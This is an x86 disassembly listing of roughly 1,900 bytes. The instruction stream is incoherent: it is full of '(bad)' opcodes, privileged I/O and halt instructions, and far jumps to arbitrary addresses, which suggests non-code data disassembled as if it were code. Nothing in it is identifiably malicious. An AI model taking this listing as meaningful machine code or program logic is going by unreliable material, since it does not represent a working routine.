  42c324:	adc    dh,BYTE PTR [ebp+0x2d477002]
  42c32a:	or     DWORD PTR [ebp+0x12],esp
  42c32d:	je     0x42c331
  42c32f:	jmp    0x9b91706f
  42c334:	cmp    ebp,DWORD PTR [esi+0x7f]
  42c337:	lds    eax,FWORD PTR [edx]
  42c339:	jne    0x42c33d
  42c33b:	outs   dx,BYTE PTR ds:[esi]
  42c33c:	addr16 jge 0x42c374
  42c33f:	mov    edi,0xcc7ef013
  42c344:	in     al,0xdf
  42c346:	fdivr  DWORD PTR [eax+0x1a496ddb]
  42c34c:	in     eax,0xf6
  42c34e:	shl    ecx,0x7f
  42c351:	sub    eax,0x5303e903
  42c356:	and    cl,BYTE PTR [edi-0x6f15005]
  42c35c:	mov    ecx,0xf600026b
  42c361:	mov    al,0x89
  42c363:	inc    esp
  42c364:	adc    DWORD PTR [ecx+ebx*4+0xa],ecx
  42c368:	ins    DWORD PTR es:[edi],dx
  42c369:	call   0x58f5:0x2ce9fad8
  42c370:	dec    edi
  42c371:	inc    BYTE PTR [eax]
  42c373:	data16 stc 
  42c375:	add    eax,DWORD PTR [esi-0x22a639e5]
  42c37b:	jle    0x42c326
  42c37d:	outs   dx,BYTE PTR ds:[esi]
  42c37e:	jmp    0x42c375
  42c380:	jmp    0x2cc9c5fb
  42c385:	add    BYTE PTR [eax],al
  42c387:	add    BYTE PTR [eax],al
  42c389:	add    BYTE PTR [ecx+0x49],bl
  42c38c:	callw  0x25b
  42c390:	repnz cmp DWORD PTR [ecx],ebp
  42c393:	scas   eax,DWORD PTR es:[edi]
  42c394:	dec    ecx
  42c395:	xchg   esi,eax
  42c396:	pop    ecx
  42c397:	test   BYTE PTR [edi+0xfebade],bh
  42c39d:	jmp    0x779fde18
  42c3a2:	and    DWORD PTR [ebx+edi*8+0xb0276e9],eax
  42c3a9:	aaa    
  42c3aa:	pop    ebx
  42c3ab:	aam    0x4e
  42c3ad:	mov    ecx,0x62137e8b
  42c3b2:	adc    ebp,ebx
  42c3b4:	dec    edi
  42c3b5:	inc    ecx
  42c3b6:	les    ecx,FWORD PTR [ecx-0x5]
  42c3b9:	dec    esi
  42c3ba:	jp     0x42c353
  42c3bc:	or     ch,BYTE PTR [ebp-0x2c]
  42c3bf:	xlat   BYTE PTR ds:[ebx]
  42c3c0:	cli    
  42c3c1:	jmp    0x3f8755a7
  42c3c6:	pop    esi
  42c3c7:	jnp    0x42c3cd
  42c3c9:	aad    0xcd
  42c3cb:	fdiv   st(2),st
  42c3cd:	je     0x42c362
  42c3cf:	retf   0xba4f
  42c3d2:	and    eax,0xcdfd8485
  42c3d7:	fdiv   st(2),st
  42c3d9:	mov    ecx,0xc8363f
  42c3de:	jnp    0x42c3e8
  42c3e0:	loopne 0x42c3f7
  42c3e2:	fadd   QWORD PTR [ebx]
  42c3e4:	test   eax,eax
  42c3e6:	and    ah,bl
  42c3e8:	rol    BYTE PTR [ebp-0x5d],0xd8
  42c3ec:	out    0x99,eax
  42c3ee:	add    BYTE PTR [eax],al
  42c3f0:	add    BYTE PTR [eax],al
  42c3f2:	add    BYTE PTR [ebx+eax*1-0x7831ce00],bl
  42c3f9:	inc    ebx
  42c3fa:	enter  0xbf67,0x6e
  42c3fe:	adc    ebx,DWORD PTR [ebx-0x57743b87]
  42c404:	jno    0x42c3b8
  42c406:	cmp    DWORD PTR [edx+ecx*1+0x3ed71d74],esp
  42c40d:	sbb    al,0x3b
  42c40f:	(bad)  
  42c411:	hlt    
  42c412:	(bad)  
  42c413:	push   ds
  42c414:	jle    0x42c40a
  42c416:	add    ch,BYTE PTR [esi-0x3d]
  42c419:	rol    BYTE PTR [ebp-0x1d],0x9
  42c41d:	div    DWORD PTR [ebp+0x14]
  42c420:	jecxz  0x42c435
  42c422:	call   0xeb430778
  42c427:	jae    0x42c40c
  42c429:	push   0x10
  42c42b:	stos   DWORD PTR es:[edi],eax
  42c42c:	cs sbb al,ch
  42c42f:	enter  0xf5ff,0xff
  42c433:	test   DWORD PTR [ecx-0x28],ecx
  42c436:	cmp    ebx,DWORD PTR [edi+0x39]
  42c439:	inc    ch
  42c43b:	sar    DWORD PTR [ebx+0x6c49eaff],1
  42c441:	jnp    0x42c47b
  42c443:	sar    DWORD PTR [ecx],cl
  42c445:	iret   
  42c446:	mov    DWORD PTR [ebx+ebx*8],edx
  42c449:	xchg   DWORD PTR [eax-0x30],ebx
  42c44c:	out    0xc5,eax
  42c44e:	mov    ecx,DWORD PTR [ecx]
  42c450:	or     ecx,DWORD PTR [ebx+0x6a]
  42c453:	loopne 0x42c4c6
  42c455:	inc    ebx
  42c456:	mov    ah,0x0
  42c458:	add    BYTE PTR [eax],al
  42c45a:	add    BYTE PTR [eax],al
  42c45c:	or     al,0xeb
  42c45e:	adc    ecx,DWORD PTR [esi+0x75]
  42c461:	lock fiadd WORD PTR [ebx+0x664b6cb5]
  42c468:	mov    DWORD PTR [ebx+0x6],esi
  42c46b:	sti    
  42c46c:	pusha  
  42c46d:	fxch   st(4)
  42c46f:	ds jne 0x42c442
  42c472:	mov    eax,0x1af13088
  42c477:	mov    edi,0x44c8e708
  42c47c:	sub    cl,0xe9
  42c47f:	adc    al,0xf
  42c481:	jmp    0x42c4be
  42c483:	(bad)  
  42c484:	in     al,dx
  42c485:	loopne 0x42c4f3
  42c487:	add    al,0x0
  42c489:	sets   BYTE PTR [esi+0x35]
  42c48d:	loopne 0x42c4c2
  42c48f:	push   eax
  42c490:	dec    ebp
  42c491:	jle    0x42c497
  42c493:	cli    
  42c494:	pop    edx
  42c495:	popa   
  42c496:	pusha  
  42c497:	or     BYTE PTR [esi-0x4f72fe0f],ah
  42c49d:	stos   DWORD PTR es:[edi],eax
  42c49e:	cs call 0xfb21e3cd
  42c4a4:	icebp  
  42c4a5:	stos   DWORD PTR es:[edi],eax
  42c4a6:	push   edi
  42c4a7:	adc    DWORD PTR [edx],esi
  42c4a9:	xlat   BYTE PTR ds:[ebx]
  42c4aa:	mov    dh,0xe7
  42c4ac:	ret    0xe0e9
  42c4af:	cli    
  42c4b0:	stos   DWORD PTR es:[di],eax
  42c4b2:	cmp    eax,0xc4a2be5a
  42c4b7:	add    esi,DWORD PTR [ebp+0x25]
  42c4ba:	dec    eax
  42c4bb:	div    DWORD PTR [ebx+eiz*1+0x41]
  42c4bf:	repz add BYTE PTR [eax],al
  42c4c2:	add    BYTE PTR [eax],al
  42c4c4:	add    BYTE PTR [edx+0x66],dh
  42c4c7:	pop    ds
  42c4c8:	add    dh,BYTE PTR [ebp-0x15]
  42c4cb:	push   0x8a2b3887
  42c4d0:	je     0x42c49f
  42c4d2:	mov    ebp,0xdc77418b
  42c4d7:	cwde   
  42c4d8:	inc    esp
  42c4d9:	mov    al,0xa3
  42c4db:	or     eax,0xec02b584
  42c4e0:	add    esi,DWORD PTR [ebp+0x4a]
  42c4e3:	jmp    0x2d03:0xe8ff7087
  42c4ea:	dec    esi
  42c4eb:	loopne 0x42c4b6
  42c4ed:	cmp    ebp,ecx
  42c4ef:	jmp    0xe9426ce0
  42c4f4:	add    ebx,ebp
  42c4f6:	sub    al,0x3
  42c4f9:	jne    0x42c486
  42c4fb:	mov    ds:0x953ffd93,eax
  42c500:	(bad)  
  42c501:	xor    DWORD PTR [edx+0x26f98f38],edx
  42c507:	shl    cl,cl
  42c509:	jg     0x42c53d
  42c50b:	xor    ah,cl
  42c50d:	mov    DWORD PTR [edx+0x7f7543db],esi
  42c513:	test   al,0x11
  42c515:	clc    
  42c516:	mov    ecx,0x877503ec
  42c51b:	and    esi,DWORD PTR [eax-0x794783e]
  42c521:	dec    esi
  42c522:	aad    0x99
  42c524:	xor    al,0xa6
  42c526:	aad    0xfb
  42c528:	fild   DWORD PTR [eax]
  42c52a:	add    BYTE PTR [eax],al
  42c52c:	add    BYTE PTR [eax],al
  42c52e:	popa   
  42c52f:	inc    edx
  42c530:	jmp    0x6c47b7bb
  42c535:	mov    ds:0x69e90276,al
  42c53a:	mov    ds:0x1fe0c497,al
  42c53f:	aad    0xd1
  42c541:	imul   edi,esp,0xfe1127e
  42c547:	aad    0xd3
  42c549:	paddsb mm6,QWORD PTR [esi-0x54]
  42c54d:	loopne 0x42c54e
  42c54f:	aam    0x5f
  42c551:	jg     0x42c4f5
  42c553:	aad    0x41
  42c555:	loope  0x42c550
  42c557:	mov    cs,WORD PTR [ecx+eiz*8]
  42c55a:	(bad)  
  42c55c:	inc    DWORD PTR [eax-0x21]
  42c55f:	xor    ebx,edi
  42c561:	cs (bad) 
  42c563:	cmp    eax,0xd7a96ae8
  42c568:	or     ah,BYTE PTR [ebp-0xd]
  42c56b:	add    BYTE PTR [eax],al
  42c56d:	jmp    0xe93d9ac0
  42c572:	jbe    0x42c5d0
  42c574:	or     BYTE PTR [esi],al
  42c576:	adc    dl,0xc5
  42c579:	stos   BYTE PTR es:[edi],al
  42c57a:	jbe    0x42c555
  42c57c:	adc    al,0x1d
  42c57e:	mov    ds:0xb1620014,eax
  42c583:	or     esi,edi
  42c585:	pop    esp
  42c586:	jle    0x42c548
  42c588:	inc    esp
  42c589:	(bad)  
  42c58a:	ja     0x42c577
  42c58c:	pop    edi
  42c58d:	in     eax,dx
  42c58e:	jbe    0x42c592
  42c590:	sti    
  42c591:	push   esp
  42c592:	add    BYTE PTR [eax],al
  42c594:	add    BYTE PTR [eax],al
  42c596:	add    BYTE PTR [ecx+0x7d],bl
  42c599:	je     0x42c58c
  42c59b:	mov    eax,ds:0x9cd174d7
  42c5a0:	jmp    0xb17e:0xd955b28c
  42c5a7:	ja     0x42c5b0
  42c5a9:	test   edx,ebx
  42c5ab:	jb     0x42c5af
  42c5ad:	add    BYTE PTR [edx-0x45],dh
  42c5b0:	jmp    0x5c7e:0xd945247e
  42c5b7:	push   esi
  42c5b8:	fdivr  st,st(2)
  42c5ba:	xchg   BYTE PTR ds:0xef995c8b,dl
  42c5c0:	fsub   QWORD PTR ss:[eax+0x5b]
  42c5c4:	faddp  st(2),st
  42c5c6:	fs or  bl,dl
  42c5c9:	cli    
  42c5ca:	data16 jo 0x42c5cf
  42c5cd:	add    cl,ch
  42c5cf:	out    dx,eax
  42c5d0:	mov    ss,WORD PTR [edi]
  42c5d2:	push   edi
  42c5d3:	adc    eax,0xf26488d9
  42c5d8:	fsqrt  
  42c5da:	add    BYTE PTR [ebx],dh
  42c5dc:	call   0xec9b9
  42c5e1:	div    BYTE PTR [ebp-0x2c]
  42c5e4:	test   BYTE PTR [ebx-0xa1d5dec],al
  42c5ea:	call   0x3a09d8
  42c5ef:	pop    eax
  42c5f0:	mov    edi,0x67ff186e
  42c5f5:	idiv   edi
  42c5f7:	pushf  
  42c5f8:	dec    DWORD PTR [esi-0x1]
  42c5fb:	add    BYTE PTR [eax],al
  42c5fd:	add    BYTE PTR [eax],al
  42c5ff:	add    BYTE PTR [ecx],ch
  42c601:	pop    es
  42c602:	not    DWORD PTR ds:0x3acc60
  42c608:	or     DWORD PTR [edi-0x18e71fb],edi
  42c60e:	(bad)  
  42c60f:	call   DWORD PTR [ebx+0x198de839]
  42c615:	(bad)  
  42c617:	jmp    DWORD PTR [ebx-0x230fbc45]
  42c61d:	(bad)  
  42c61e:	(bad)  
  42c61f:	inc    DWORD PTR [edx+ecx*2+0x4c]
  42c623:	jmp    DWORD PTR [ebx]
  42c625:	mov    bh,BYTE PTR [edx-0x36237f1]
  42c62b:	call   FWORD PTR [edx+esi*2+0x43]
  42c62f:	lock mov WORD PTR [ecx-0x7d],?
  42c633:	sub    al,0xe3
  42c635:	mov    dl,0xf5
  42c637:	push   eax
  42c638:	jg     0x42c6a0
  42c63a:	idiv   edi
  42c63c:	sbb    al,0xff
  42c63e:	dec    esi
  42c63f:	jmp    FWORD PTR [ecx]
  42c641:	out    0xf5,eax
  42c643:	adc    eax,0x3accdc
  42c648:	xchg   edi,eax
  42c649:	scas   al,BYTE PTR es:[edi]
  42c64a:	xchg   DWORD PTR [ebp-0x18],esi
  42c64d:	imul   dl
  42c64f:	jb     0xd42bfdb
  42c655:	cmp    al,0x6
  42c658:	jne    0x42c636
  42c65a:	sub    BYTE PTR [edi+0x77],0xe9
  42c65e:	(bad)  
  42c65f:	popa   
  42c660:	(bad)  
  42c661:	gs xor bl,bh
  42c664:	add    BYTE PTR [eax],al
  42c666:	add    BYTE PTR [eax],al
  42c668:	add    dl,ah
  42c66a:	adc    esp,DWORD PTR [edx+0x39]
  42c66d:	lock mov ah,0xda
  42c670:	cli    
  42c671:	shl    BYTE PTR [ebx-0x1688a479],cl
  42c677:	(bad)  
  42c678:	popa   
  42c679:	mul    BYTE PTR [eax]
  42c67b:	(bad)  
  42c67c:	je     0x42c6e9
  42c67e:	pusha  
  42c67f:	mov    DWORD PTR [edi],edx
  42c681:	mov    cl,0x3
  42c683:	(bad)  [esi]
  42c685:	lock cwde 
  42c687:	fsqrt  
  42c689:	mov    ds:0xf661f6ef,al
  42c68e:	shl    cl,1
  42c690:	je     0x42c700
  42c692:	jg     0x42c682
  42c694:	mov    eax,?
  42c696:	hlt    
  42c697:	(bad)  
  42c699:	and    BYTE PTR [ebp-0x70],0x1b
  42c69d:	jns    0x42c64a
  42c69f:	(bad)  
  42c6a1:	mov    ecx,0xf0fadcda
  42c6a6:	fwait
  42c6a7:	or     DWORD PTR [ebp-0x12266],eax
  42c6ad:	cmc    
  42c6ae:	sbb    dh,bh
  42c6b0:	inc    DWORD PTR [edx+0x4afe0066]
  42c6b6:	fsub   QWORD PTR [ecx+edi*1+0x62]
  42c6ba:	loopne 0x42c643
  42c6bc:	adc    esi,DWORD PTR [edi-0x25]
  42c6bf:	(bad)  
  42c6c0:	cmp    al,dl
  42c6c2:	xchg   DWORD PTR [edi+0x2e],edx
  42c6c5:	sub    cl,bh
  42c6c7:	into   
  42c6c8:	mov    eax,?
  42c6ca:	mov    edi,0xfad9
  42c6cf:	add    BYTE PTR [eax],al
  42c6d1:	add    BYTE PTR [edx],bl
  42c6d3:	in     al,dx
  42c6d4:	nop
  42c6d5:	test   cl,ch
  42c6d7:	pop    esi
  42c6d8:	(bad)  
  42c6da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c6db:	add    dl,BYTE PTR [ecx-0x78]
  42c6de:	add    dl,al
  42c6e0:	pop    ecx
  42c6e1:	gs jp  0x42c673
  42c6e4:	jl     0x42c6c6
  42c6e6:	out    dx,eax
  42c6e7:	shl    ecx,1
  42c6e9:	pop    eax
  42c6ea:	jns    0x42c767
  42c6ec:	arpl   WORD PTR [edi-0x73c62e1f],bp
  42c6f2:	stc    
  42c6f3:	push   0x33
  42c6f5:	fmulp  st(7),st
  42c6f7:	jge    0x42c69c
  42c6f9:	sar    ebp,cl
  42c6fb:	inc    edi
  42c6fc:	or     eax,0xe902f56b
  42c701:	add    ebp,eax
  42c703:	xchg   esp,eax
  42c705:	fisubr WORD PTR [edi-0x51cc4a2f]
  42c70b:	imul   DWORD PTR [eax-0x15fd9d0b]
  42c711:	xchg   ebp,eax
  42c712:	aaa    
  42c713:	add    eax,0x3a7ec766
  42c718:	fiadd  DWORD PTR [edi+0x3e90286]
  42c71e:	sub    eax,0x2d1a553a
  42c723:	add    DWORD PTR [ebx+edx*4+0x75],ebp
  42c727:	add    ch,cl
  42c729:	sub    BYTE PTR [eax+edi*8-0xf],0x8d
  42c72e:	sbb    al,BYTE PTR [ebx]
  42c730:	jmp    0x113c9a38
  42c735:	data16 add BYTE PTR [eax],al
  42c738:	add    BYTE PTR [eax],al
  42c73a:	add    ah,bh
  42c73c:	xchg   ah,bh
  42c73e:	fmul   QWORD PTR [edi-0x2f]
  42c741:	push   cs
  42c742:	hlt    
  42c743:	icebp  
  42c744:	dec    eax
  42c745:	in     eax,0x33
  42c747:	call   0x301fa3d2
  42c74c:	sar    DWORD PTR [eax],1
  42c74e:	lds    esi,FWORD PTR [ecx+0x7503e4d2]
  42c754:	add    dl,BYTE PTR [ecx-0x30e50d]
  42c75a:	jne    0x42c6fb
  42c75c:	imul   al
  42c75e:	test   DWORD PTR [ecx+0x2],esi
  42c761:	add    BYTE PTR [ebx-0x48],dh
  42c764:	push   es
  42c765:	test   BYTE PTR [ecx],ch
  42c767:	push   0x76e86e86
  42c76c:	add    cl,BYTE PTR [ebx]
  42c76e:	xchg   edi,eax
  42c76f:	mov    cl,0x7d
  42c771:	inc    edi
  42c772:	out    dx,al
  42c773:	jge    0x42c748
  42c775:	or     ch,BYTE PTR [edi+0x52]
  42c778:	add    eax,DWORD PTR [eax]
  42c77a:	jmp    0xe48d4705
  42c77f:	xchg   DWORD PTR [edi-0x74],edi
  42c782:	jge    0x42c759
  42c784:	retf   
  42c785:	cli    
  42c786:	mov    eax,0x14fab0ce
  42c78b:	rol    dl,1
  42c78d:	and    esp,0x22
  42c790:	int    0xfa
  42c792:	push   es
  42c793:	jns    0x42c814
  42c795:	push   edi
  42c796:	in     al,0x85
  42c798:	ret    0xa48c
  42c79b:	ret    0x5031
  42c79e:	cdq    
  42c79f:	add    BYTE PTR [eax],al
  42c7a1:	add    BYTE PTR [eax],al
  42c7a3:	add    bh,bh
  42c7a5:	inc    ebp
  42c7a6:	int3   
  42c7a7:	je     0x42c7a4
  42c7a9:	je     0x42c7a6
  42c7ab:	ficomp WORD PTR [ecx+0x56fcfb40]
  42c7b1:	idiv   DWORD PTR [edi]
  42c7b3:	jmp    0x6c4d57ab
  42c7b8:	pop    DWORD PTR [ecx]
  42c7ba:	add    cl,ch
  42c7bc:	test   al,al
  42c7be:	cs mov edi,0xf2cc46fd
  42c7c4:	xor    BYTE PTR [edi+ecx*1-0xa],dl
  42c7c8:	call   0xea704e92
  42c7cd:	xchg   edi,eax
  42c7ce:	cmp    BYTE PTR [ecx],ah
  42c7d0:	jge    0x42c828
  42c7d2:	punpckldq mm6,DWORD PTR [esi-0x2dffc912]
  42c7d9:	cmp    ah,dh
  42c7db:	dec    dh
  42c7dd:	xor    esp,0x2
  42c7e0:	push   cs
  42c7e1:	(bad)  
  42c7e2:	out    0xff,eax
  42c7e4:	sbb    al,0x4
  42c7e6:	add    BYTE PTR [ebx-0x76b02c3c],cl
  42c7ec:	leave  
  42c7ed:	mov    bl,0xf5
  42c7ef:	jo     0x42c7d5
  42c7f1:	add    BYTE PTR [ebx-0xa51c4d4],0x50
  42c7f8:	inc    esp
  42c7f9:	cmp    bh,dh
  42c7fb:	std    
  42c7fc:	fwait
  42c7fd:	gs jnp 0x42c7bd
  42c800:	js     0x42c7af
  42c802:	cmc    
  42c803:	jmp    DWORD PTR [ebx+0x890c38]
  42c809:	add    BYTE PTR [eax],al
  42c80b:	add    BYTE PTR [eax],al
  42c80d:	and    DWORD PTR [edi-0x9],eax
  42c810:	call   FWORD PTR [ebx+0x7c]
  42c813:	mov    bl,0x30
  42c815:	mov    ebp,DWORD PTR [esi-0x3ffe000b]
  42c81b:	cmc    
  42c81c:	adc    eax,0x3ad884
  42c821:	xchg   DWORD PTR [esi],ebx
  42c823:	jnp    0x42c823
  42c825:	xchg   esi,eax
  42c826:	inc    BYTE PTR [ebp+0x39cbf]
  42c82c:	push   0xffffff8e
  42c82e:	or     ebx,DWORD PTR [esi-0x77]
  42c831:	adc    DWORD PTR [edx],ebx
  42c833:	idiv   edi
  42c835:	dec    ebx
  42c836:	pusha  
  42c837:	add    al,0x8d
  42c839:	xchg   ebx,eax
  42c83a:	add    dl,BYTE PTR [eax-0x73]
  42c83d:	shl    esi,1
  42c83f:	idiv   bh
  42c841:	sbb    edx,DWORD PTR [esi]
  42c843:	mov    edi,0xfad60c45
  42c848:	call   FWORD PTR [ebx+ebx*8+0x22]
  42c84c:	call   FWORD PTR [ecx]
  42c84e:	stos   DWORD PTR es:[edi],eax
  42c84f:	or     BYTE PTR fs:[edi+0x75048364],dh
  42c856:	fadd   DWORD PTR [ecx+0x595c77be]
  42c85c:	in     al,dx
  42c85d:	and    bh,bh
  42c85f:	mov    WORD PTR [ebx+ecx*2-0x770528b0],es
  42c866:	out    dx,al
  42c867:	imul   eax,DWORD PTR [eax-0x7301268b],0xfffffff8
  42c86e:	int3   
  42c86f:	xlat   BYTE PTR ds:[ebx]
  42c870:	cli    
  42c871:	add    BYTE PTR [eax],al
  42c873:	add    BYTE PTR [eax],al
  42c875:	add    dl,bh
  42c877:	mov    dl,0xfe
  42c879:	dec    edi
  42c87a:	repnz int 0x3e
  42c87d:	adc    dh,BYTE PTR ds:0xf88760d9
  42c883:	hlt    
  42c884:	(bad)  
  42c885:	cli    
  42c886:	fcmovb st,st(6)
  42c888:	mov    eax,DWORD PTR [ecx+ebp*2+0x7afad716]
  42c88f:	pop    eax
  42c890:	les    edi,FWORD PTR [esi-0x47]
  42c893:	aam    0x87
  42c895:	mov    ah,0x61
  42c897:	out    dx,al
  42c898:	(bad)  
  42c899:	cli    
  42c89a:	cld    
  42c89b:	popf   
  42c89c:	mov    dl,0xe7
  42c89e:	jno    0x42c90f
  42c8a0:	aad    0xfa
  42c8a2:	in     al,dx
  42c8a3:	popf   
  42c8a4:	loop   0x42c924
  42c8a6:	popf   
  42c8a7:	iret   
  42c8a8:	add    eax,0xfeda2784
  42c8ad:	inc    DWORD PTR [esi+0x19]
  42c8b0:	cmp    DWORD PTR [ecx+eiz*4-0x31],0x5
  42c8b5:	xchg   ebp,eax
  42c8b6:	mov    ch,0x10
  42c8b8:	sbb    edi,0xffffff81
  42c8bb:	pop    eax
  42c8bc:	mov    edi,0xb426fc05
  42c8c1:	cmp    al,al
  42c8c3:	outs   dx,DWORD PTR ds:[esi]
  42c8c4:	pop    eax
  42c8c5:	daa    
  42c8c6:	push   0x54
  42c8c8:	sub    BYTE PTR [ebx],0x52
  42c8cb:	xchg   ebp,eax
  42c8cc:	aad    0x38
  42c8ce:	mov    al,0x7f
  42c8d0:	dec    edi
  42c8d1:	sbb    eax,DWORD PTR [edx+0x3]
  42c8d4:	sbb    al,0xd4
  42c8d6:	jmp    0x11d9562
  42c8db:	add    BYTE PTR [eax],al
  42c8dd:	add    BYTE PTR [eax],al
  42c8df:	das    
  42c8e0:	into   
  42c8e1:	cmp    BYTE PTR [edi+0x3feb6b1],cl
  42c8e7:	pop    edx
  42c8e8:	rcr    DWORD PTR [eax],0x89
  42c8eb:	jbe    0x42c8da
  42c8ed:	sbb    bl,bl
  42c8ef:	mov    esi,ebx
  42c8f1:	jno    0x42c8e3
  42c8f3:	ss clc 
  42c8f5:	sub    BYTE PTR [edx+eax*4],al
  42c8f8:	dec    edi
  42c8f9:	push   ebp
  42c8fa:	fisubr DWORD PTR [edi-0x7a]
  42c8fd:	call   0xd950:0x52027503
  42c904:	jg     0x42c969
  42c906:	out    dx,eax
  42c907:	fmul   st(5),st
  42c909:	inc    ecx
  42c90a:	jmp    0x42c967
  42c90c:	cmp    edi,DWORD PTR [edx]
  42c90e:	(bad)  
  42c910:	ret    0x7fe1
  42c913:	adc    al,BYTE PTR [ebx]
  42c915:	jmp    0x399ac31d
  42c91a:	mov    BYTE PTR [ecx],dh
  42c91c:	sar    BYTE PTR [eax+0x121ef988],cl
  42c922:	fisubr DWORD PTR [edi+0x33bed632]
  42c928:	mov    al,BYTE PTR [ecx]
  42c92a:	ficomp DWORD PTR [edx+0x42c1cdcd]
  42c930:	jg     0x42c91e
  42c932:	adc    ah,BYTE PTR ds:0x7fe773cd
  42c938:	neg    DWORD PTR [eax]
  42c93a:	repnz cmp al,BYTE PTR [edx]
  42c93d:	push   ds
  42c93e:	(bad)
  42c941:	loope  0x42c8d3
  42c943:	add    BYTE PTR [eax],al
  42c945:	add    BYTE PTR [eax],al
  42c947:	add    cl,bh
  42c949:	sbb    eax,0xb5fd9ca
  42c94e:	xor    al,0xb8
  42c950:	loope  0x42c9a8
  42c952:	test   dl,0xd4
  42c955:	jnp    0x42c956
  42c957:	in     eax,0xfe
  42c959:	aaa    
  42c95a:	inc    BYTE PTR [esi-0x8]
  42c95d:	lea    ebp,[ebx]
  42c95f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c960:	sbb    al,0xc8
  42c962:	adc    ch,dh
  42c964:	mov    ds:0xf1a0f9c2,eax
  42c969:	loope  0x42c969
  42c96b:	mov    ?,WORD PTR [esi]
  42c96d:	dec    esp
  42c96e:	jge    0x42c915
  42c970:	and    al,0x85
  42c972:	dec    edx
  42c973:	jmp    0x7df3:0xd96604c3
  42c97a:	xor    ebp,DWORD PTR [esi+0x1c]
  42c97d:	enter  0xf7e6,0xf1
  42c981:	dec    ebp
  42c982:	fsub   st(3),st
  42c984:	inc    ebx
  42c985:	inc    ebx
  42c986:	in     ax,dx
  42c988:	repz jge 0x42c9ba
  42c98b:	dec    esi
  42c98c:	mov    esp,0x2c7450c7
  42c991:	push   es
  42c992:	push   ecx
  42c993:	push   ecx
  42c994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c995:	int    0xfc
  42c997:	ss pop ebx
  42c999:	int3   
  42c99a:	mov    ebx,DWORD PTR [edi+ecx*4-0x37]
  42c99e:	cli    
  42c99f:	xchg   BYTE PTR es:[edi+0x4b],bh
  42c9a3:	(bad)  
  42c9a4:	int3   
  42c9a5:	xor    eax,ebp
  42c9a7:	aaa    
  42c9a8:	ret    0xfacd
  42c9ab:	push   cs
  42c9ac:	add    BYTE PTR [eax],al
  42c9ae:	add    BYTE PTR [eax],al
  42c9b0:	add    BYTE PTR [edx],dh
  42c9b2:	out    0x8c,al
  42c9b4:	je     0x42c9db
  42c9b6:	into   
  42c9b7:	cli    
  42c9b8:	inc    BYTE PTR [edi+0x3d]
  42c9bb:	jmp    FWORD PTR [esi]
  42c9bd:	inc    ecx
  42c9be:	xor    ebx,edi
  42c9c0:	je     0x42c950
  42c9c2:	(bad)  
  42c9c3:	adc    al,0xad
  42c9c5:	mov    ecx,DWORD PTR [eax+eax*1]
  42c9c8:	sar    BYTE PTR [eax+0x1b],cl
  42c9cb:	xlat   BYTE PTR ds:[ebx]
  42c9cc:	bound  ebp,QWORD PTR [ebx-0x65fd122]
  42c9d2:	sar    edx,cl
  42c9d4:	add    BYTE PTR [ebx+0x5d],ah
  42c9d7:	ror    BYTE PTR [ecx-0x9e027],0x3
  42c9de:	xchg   DWORD PTR [edi+0xe84d502],edi
  42c9e4:	(bad)  
  42c9e5:	adc    ebp,DWORD PTR [ebx+0x79244d81]
  42c9eb:	mov    ebx,DWORD PTR [eax]
  42c9ed:	add    ch,BYTE PTR [ebx-0x217e740b]
  42c9f3:	xchg   DWORD PTR [ebp-0xa55f0],ecx
  42c9f9:	outs   dx,DWORD PTR ds:[esi]
  42c9fa:	adc    eax,0xdb998d4b
  42c9ff:	clc    
  42ca00:	call   DWORD PTR [ebx-0x600b4f1]
  42ca06:	stos   DWORD PTR es:[edi],eax
  42ca07:	adc    eax,DWORD PTR [eax-0x24]
  42ca0a:	dec    esp
  42ca0b:	mov    ebx,0xfbf8530f
  42ca10:	push   DWORD PTR [ebx]
  42ca12:	jle    0x42ca87
  42ca14:	in     al,dx
  42ca15:	add    BYTE PTR [eax],al
  42ca17:	add    BYTE PTR [eax],al
  42ca19:	add    BYTE PTR [edi+esi*2+0x46],al
  42ca1d:	call   DWORD PTR [ebx-0x7b7cf722]
  42ca23:	stos   BYTE PTR es:[edi],al
  42ca24:	jae    0x42ca2c
  42ca26:	call   0x8806:0x6701ef0c
  42ca2d:	pop    ebp
  42ca2e:	push   edi
  42ca2f:	adc    ch,al
  42ca31:	and    eax,DWORD PTR [ecx+0x98bf5b4]
  42ca37:	fsub   st,st(7)
  42ca39:	cmc    
  42ca3a:	mov    edi,?
  42ca3c:	inc    ebp
  42ca3e:	fnstenv [edx+0x8de8ff]
  42ca44:	add    BYTE PTR [eax],al
  42ca46:	mov    edi,0x528360bf
  42ca4b:	(bad)  [eax-0x77]
  42ca4e:	call   0xf43f:0x750d7500
  42ca55:	mov    WORD PTR [ebx+0x65e82ee1],?
  42ca5b:	(bad)  
  42ca5c:	fdivr  st,st(2)
  42ca5e:	pop    esi
  42ca5f:	fmul   DWORD PTR [ebx-0x459f8ea7]
  42ca65:	out    0x8b,eax
  42ca67:	pop    ds
  42ca68:	sar    edx,cl
  42ca6a:	out    dx,al
  42ca6b:	push   0x5845748c
  42ca70:	sar    dl,cl
  42ca72:	jp     0x42cad1
  42ca74:	cmp    bh,0x22
  42ca77:	(bad)  
  42ca79:	je     0x42ca90
  42ca7b:	call   0x431da9
  42ca80:	add    BYTE PTR [eax],al
  42ca82:	add    BYTE PTR ds:0xafaca49,bl
  42ca88:	pusha  
  42ca89:	fdivr  QWORD PTR [esi+0x2]
  42ca8c:	fimul  DWORD PTR [edi+0x47]
  42ca8f:	call   0x92d131
  42ca94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ca95:	scas   al,BYTE PTR es:[edi]
  42ca96:	dec    edi
  42ca97:	fnstsw WORD PTR [ecx]
  42ca99:	inc    edi
  42ca9a:	sti    
  42ca9b:	loop   0x42cafc
  42ca9d:	push   ecx
  42ca9e:	shr    dh,1
  42caa0:	inc    eax
  42caa1:	lea    edi,[ecx+ebp*4+0x30]
  42caa5:	add    BYTE PTR [edx+ecx*8+0x13],cl
  42caa9:	jg     0x42caa5
  42caab:	ret    0x6f94
  42caae:	push   edx
  42caaf:	int    0x96
  42cab1:	idiv   ecx
  42cab3:	mov    dl,0x4f
  42cab5:	inc    ecx
  42cab6:	loopne 0x42caae
  42cab8:	and    dh,bh
  42caba:	dec    edi
  42cabb:	inc    esi
  42cabc:	xchg   esp,eax
  42cabd:	shl    DWORD PTR [ebp+ebp*2-0xf],1
  42cac1:	mov    ?,ecx
  42cac3:	xchg   edx,eax
  42cac4:	retf   
  42cac5:	test   edi,esi
  42cac7:	not    bl
